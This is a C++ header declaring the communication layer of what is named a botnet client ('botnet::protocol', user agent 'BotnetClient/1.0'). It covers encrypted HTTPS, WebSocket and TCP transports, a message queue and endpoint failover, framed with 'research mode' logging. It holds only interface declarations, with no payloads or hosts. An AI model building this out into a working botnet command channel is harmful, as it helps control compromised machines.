#pragma once

#include <boost/asio.hpp>
#include <boost/beast.hpp>
#include <boost/beast/ssl.hpp>
#include <memory>
#include <functional>
#include <queue>
#include <mutex>
#include <condition_variable>
#include <thread>
#include "message.h"
#include "crypto/encryption.h"

namespace botnet {
namespace protocol {

/**
 * @brief Cross-platform packet handler using Boost.Asio
 * 
 * Single implementation that works identically on Windows, Linux, and macOS.
 * No platform-specific networking code required.
 */
class PacketHandler {
public:
    using MessageCallback = std::function<void(std::unique_ptr<Message>)>;
    using ErrorCallback = std::function<void(const std::string&)>;
    using ConnectionCallback = std::function<void(bool connected)>;

    enum class TransportType {
        HTTPS,
        HTTP,
        WEBSOCKET,
        WEBSOCKET_SSL,
        TCP,
        TCP_SSL
    };

public:
    explicit PacketHandler(boost::asio::io_context& io_context);
    ~PacketHandler();

    // Connection management
    bool Connect(const std::string& host, uint16_t port, TransportType transport);
    void Disconnect();
    bool IsConnected() const;
    
    // Message sending
    bool SendMessage(std::unique_ptr<Message> message);
    bool SendEncryptedMessage(std::unique_ptr<Message> message, 
                             const crypto::AESEncryption& encryption);
    
    // Callback registration
    void SetMessageCallback(MessageCallback callback);
    void SetErrorCallback(ErrorCallback callback);
    void SetConnectionCallback(ConnectionCallback callback);
    
    // Configuration
    void SetTimeout(std::chrono::seconds timeout);
    void SetMaxRetries(uint32_t max_retries);
    void SetKeepAlive(bool enabled, std::chrono::seconds interval = std::chrono::seconds(30));
    
    // Research mode
    void EnableResearchMode(bool enabled);
    void SetResearchLogging(bool enabled);
    std::vector<std::string> GetConnectionLog() const;

private:
    // Transport implementations
    class HTTPSTransport;
    class HTTPTransport;
    class WebSocketTransport;
    class WebSocketSSLTransport;
    class TCPTransport;
    class TCPSSLTransport;

    boost::asio::io_context& io_context_;
    std::unique_ptr<class TransportBase> transport_;
    
    // Callbacks
    MessageCallback message_callback_;
    ErrorCallback error_callback_;
    ConnectionCallback connection_callback_;
    
    // Configuration
    std::chrono::seconds timeout_{30};
    uint32_t max_retries_{3};
    bool keep_alive_enabled_{true};
    std::chrono::seconds keep_alive_interval_{30};
    
    // Research mode
    bool research_mode_{false};
    bool research_logging_{false};
    mutable std::mutex log_mutex_;
    std::vector<std::string> connection_log_;
    
    // Internal methods
    void LogResearchActivity(const std::string& activity);
    std::unique_ptr<class TransportBase> CreateTransport(TransportType type);
};

/**
 * @brief Base class for transport implementations
 */
class TransportBase {
public:
    virtual ~TransportBase() = default;
    
    virtual bool Connect(const std::string& host, uint16_t port) = 0;
    virtual void Disconnect() = 0;
    virtual bool IsConnected() const = 0;
    virtual bool SendData(const std::vector<uint8_t>& data) = 0;
    
    virtual void SetMessageCallback(PacketHandler::MessageCallback callback) = 0;
    virtual void SetErrorCallback(PacketHandler::ErrorCallback callback) = 0;
    virtual void SetConnectionCallback(PacketHandler::ConnectionCallback callback) = 0;
    
    virtual void SetTimeout(std::chrono::seconds timeout) = 0;
    virtual void EnableKeepAlive(bool enabled, std::chrono::seconds interval) = 0;

protected:
    boost::asio::io_context& io_context_;
    
    explicit TransportBase(boost::asio::io_context& io_context) 
        : io_context_(io_context) {}
};

/**
 * @brief HTTPS transport using Boost.Beast
 */
class HTTPSTransport : public TransportBase {
public:
    explicit HTTPSTransport(boost::asio::io_context& io_context);
    ~HTTPSTransport() override;
    
    bool Connect(const std::string& host, uint16_t port) override;
    void Disconnect() override;
    bool IsConnected() const override;
    bool SendData(const std::vector<uint8_t>& data) override;
    
    void SetMessageCallback(PacketHandler::MessageCallback callback) override;
    void SetErrorCallback(PacketHandler::ErrorCallback callback) override;
    void SetConnectionCallback(PacketHandler::ConnectionCallback callback) override;
    
    void SetTimeout(std::chrono::seconds timeout) override;
    void EnableKeepAlive(bool enabled, std::chrono::seconds interval) override;
    
    // HTTPS specific
    void SetUserAgent(const std::string& user_agent);
    void SetHeaders(const std::map<std::string, std::string>& headers);
    void EnableCertificateVerification(bool enabled);

private:
    using tcp = boost::asio::ip::tcp;
    using ssl_stream = boost::beast::ssl_stream<boost::beast::tcp_stream>;
    
    std::unique_ptr<ssl_stream> stream_;
    boost::asio::ssl::context ssl_context_;
    tcp::resolver resolver_;
    
    std::string host_;
    uint16_t port_;
    bool connected_;
    
    // HTTP specific
    std::string user_agent_{"BotnetClient/1.0"};
    std::map<std::string, std::string> headers_;
    bool verify_certificates_{true};
    
    // Callbacks
    PacketHandler::MessageCallback message_callback_;
    PacketHandler::ErrorCallback error_callback_;
    PacketHandler::ConnectionCallback connection_callback_;
    
    // Configuration
    std::chrono::seconds timeout_{30};
    bool keep_alive_enabled_{true};
    std::chrono::seconds keep_alive_interval_{30};
    
    // Internal methods
    void HandleConnect(const boost::system::error_code& ec, tcp::resolver::results_type::endpoint_type endpoint);
    void HandleHandshake(const boost::system::error_code& ec);
    void HandleWrite(const boost::system::error_code& ec, std::size_t bytes_transferred);
    void HandleRead(const boost::system::error_code& ec, std::size_t bytes_transferred);
    
    void StartKeepAlive();
    void SendKeepAlive();
    
    boost::beast::http::request<boost::beast::http::string_body> CreateRequest(const std::string& body);
    void ProcessResponse(const boost::beast::http::response<boost::beast::http::string_body>& response);
};

/**
 * @brief WebSocket transport for real-time communication
 */
class WebSocketTransport : public TransportBase {
public:
    explicit WebSocketTransport(boost::asio::io_context& io_context, bool use_ssl = false);
    ~WebSocketTransport() override;
    
    bool Connect(const std::string& host, uint16_t port) override;
    void Disconnect() override;
    bool IsConnected() const override;
    bool SendData(const std::vector<uint8_t>& data) override;
    
    void SetMessageCallback(PacketHandler::MessageCallback callback) override;
    void SetErrorCallback(PacketHandler::ErrorCallback callback) override;
    void SetConnectionCallback(PacketHandler::ConnectionCallback callback) override;
    
    void SetTimeout(std::chrono::seconds timeout) override;
    void EnableKeepAlive(bool enabled, std::chrono::seconds interval) override;
    
    // WebSocket specific
    void SetSubprotocols(const std::vector<std::string>& protocols);
    void SetHeaders(const std::map<std::string, std::string>& headers);

private:
    using tcp = boost::asio::ip::tcp;
    using websocket_stream = boost::beast::websocket::stream<boost::beast::tcp_stream>;
    using websocket_ssl_stream = boost::beast::websocket::stream<boost::beast::ssl_stream<boost::beast::tcp_stream>>;
    
    std::unique_ptr<websocket_stream> ws_stream_;
    std::unique_ptr<websocket_ssl_stream> wss_stream_;
    boost::asio::ssl::context ssl_context_;
    tcp::resolver resolver_;
    
    bool use_ssl_;
    std::string host_;
    uint16_t port_;
    bool connected_;
    
    // WebSocket specific
    std::vector<std::string> subprotocols_;
    std::map<std::string, std::string> headers_;
    
    // Callbacks
    PacketHandler::MessageCallback message_callback_;
    PacketHandler::ErrorCallback error_callback_;
    PacketHandler::ConnectionCallback connection_callback_;
    
    // Configuration
    std::chrono::seconds timeout_{30};
    bool keep_alive_enabled_{true};
    std::chrono::seconds keep_alive_interval_{30};
    
    // Read/write buffers
    boost::beast::flat_buffer read_buffer_;
    std::queue<std::vector<uint8_t>> write_queue_;
    std::mutex write_mutex_;
    bool writing_{false};
    
    // Internal methods
    void HandleResolve(const boost::system::error_code& ec, tcp::resolver::results_type results);
    void HandleConnect(const boost::system::error_code& ec, tcp::resolver::results_type::endpoint_type endpoint);
    void HandleSSLHandshake(const boost::system::error_code& ec);
    void HandleWebSocketHandshake(const boost::system::error_code& ec);
    void HandleWrite(const boost::system::error_code& ec, std::size_t bytes_transferred);
    void HandleRead(const boost::system::error_code& ec, std::size_t bytes_transferred);
    
    void StartRead();
    void StartWrite();
    void ProcessWrite();
    
    void StartPing();
    void SendPing();
    void HandlePong(const boost::system::error_code& ec);
};

/**
 * @brief Message queue for handling incoming/outgoing messages
 */
class MessageQueue {
public:
    explicit MessageQueue(size_t max_size = 1000);
    ~MessageQueue();
    
    // Queue operations
    bool Push(std::unique_ptr<Message> message, MessagePriority priority = MessagePriority::NORMAL);
    std::unique_ptr<Message> Pop();
    std::unique_ptr<Message> PopWithTimeout(std::chrono::milliseconds timeout);
    
    // Queue management
    size_t Size() const;
    bool Empty() const;
    bool Full() const;
    void Clear();
    
    // Priority handling
    void SetPriorityProcessing(bool enabled);
    std::unique_ptr<Message> PopHighestPriority();
    
    // Research mode
    void EnableResearchLogging(bool enabled);
    std::vector<std::string> GetQueueLog() const;

private:
    struct QueueItem {
        std::unique_ptr<Message> message;
        MessagePriority priority;
        std::chrono::system_clock::time_point timestamp;
        
        bool operator<(const QueueItem& other) const {
            return priority < other.priority;
        }
    };
    
    mutable std::mutex mutex_;
    std::condition_variable condition_;
    std::queue<QueueItem> queue_;
    std::priority_queue<QueueItem> priority_queue_;
    
    size_t max_size_;
    bool priority_processing_{false};
    bool research_logging_{false};
    std::vector<std::string> queue_log_;
    
    void LogResearchActivity(const std::string& activity);
};

/**
 * @brief Connection manager for handling multiple transports and failover
 */
class ConnectionManager {
public:
    struct Endpoint {
        std::string host;
        uint16_t port;
        PacketHandler::TransportType transport;
        uint32_t priority;  // Lower number = higher priority
        bool enabled;
    };

public:
    explicit ConnectionManager(boost::asio::io_context& io_context);
    ~ConnectionManager();
    
    // Endpoint management
    void AddEndpoint(const Endpoint& endpoint);
    void RemoveEndpoint(const std::string& host, uint16_t port);
    void UpdateEndpointPriority(const std::string& host, uint16_t port, uint32_t priority);
    void SetEndpointEnabled(const std::string& host, uint16_t port, bool enabled);
    
    // Connection management
    bool Connect();
    void Disconnect();
    bool IsConnected() const;
    
    // Failover configuration
    void EnableFailover(bool enabled);
    void SetFailoverTimeout(std::chrono::seconds timeout);
    void SetRetryInterval(std::chrono::seconds interval);
    void SetMaxRetries(uint32_t max_retries);
    
    // Message handling
    bool SendMessage(std::unique_ptr<Message> message);
    void SetMessageCallback(PacketHandler::MessageCallback callback);
    void SetErrorCallback(PacketHandler::ErrorCallback callback);
    void SetConnectionCallback(PacketHandler::ConnectionCallback callback);
    
    // Statistics
    struct ConnectionStats {
        uint32_t total_connections;
        uint32_t successful_connections;
        uint32_t failed_connections;
        uint32_t reconnects;
        std::chrono::system_clock::time_point last_connection;
        std::chrono::milliseconds average_connection_time;
    };
    
    ConnectionStats GetStats() const;
    void ResetStats();

private:
    boost::asio::io_context& io_context_;
    std::vector<Endpoint> endpoints_;
    std::unique_ptr<PacketHandler> current_handler_;
    
    // Current connection info
    size_t current_endpoint_index_{0};
    bool connected_{false};
    
    // Failover configuration
    bool failover_enabled_{true};
    std::chrono::seconds failover_timeout_{10};
    std::chrono::seconds retry_interval_{5};
    uint32_t max_retries_{3};
    uint32_t current_retries_{0};
    
    // Callbacks
    PacketHandler::MessageCallback message_callback_;
    PacketHandler::ErrorCallback error_callback_;
    PacketHandler::ConnectionCallback connection_callback_;
    
    // Statistics
    mutable std::mutex stats_mutex_;
    ConnectionStats stats_{};
    
    // Failover timer
    std::unique_ptr<boost::asio::steady_timer> failover_timer_;
    
    // Internal methods
    void SortEndpointsByPriority();
    bool TryNextEndpoint();
    void HandleConnectionError(const std::string& error);
    void StartFailoverTimer();
    void HandleFailoverTimeout(const boost::system::error_code& ec);
    void UpdateConnectionStats(bool success, std::chrono::milliseconds duration);
};

} // namespace protocol
} // namespace botnet
